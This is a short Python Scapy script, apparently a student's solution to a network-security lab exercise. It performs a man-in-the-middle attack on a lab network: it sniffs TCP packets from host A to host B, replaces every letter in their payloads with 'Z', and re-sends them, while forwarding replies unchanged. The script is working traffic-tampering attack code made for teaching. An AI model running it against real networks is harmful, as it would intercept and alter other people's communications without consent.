from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):

	if pkt[IP].src == '10.9.0.1':
		pass
	elif pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
		# Create a new packet based on the captured one
		# 1) We need to delete the checksum in the IP & TCP headers
		#	because our modification will make them invalid
		#	SCAPY will recalculate them if these fields are missing
		#	2)	We also delete the original TCP payload

		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)

	##############################################################

		# Construct the new payload based on the old payload
		# Students need to implement this part

		if pkt[TCP].payload:
			data = pkt[TCP].payload.load # The original payload data
			print("DATA: " + str(data))
			data = list(data)
			for i in range(0, len(data)):
				if chr(data[i]).isalpha():
					data[i]=ord('Z')
#			newdata = data # No change is made in this sample code
			data = bytes(data)
			send(newpkt/data)
		else:
			send(newpkt)
	###############################################################
	elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
		# Create new packet based on the captured one
		# Do not make any change
		newpkt=IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].chksum)
		send(newpkt)
#Filters the packets to find the ones that belong only to the MAC Addresses of Host B and Host A
#https://www.ibm.com/docs/en/qsip/7.4?topic=queries-berkeley-packet-filters
f='tcp and ether dst host 02:42:25:d2:6e:c3'
pkt = sniff(iface='br-ea46140da24a', filter=f, prn=spoof_pkt)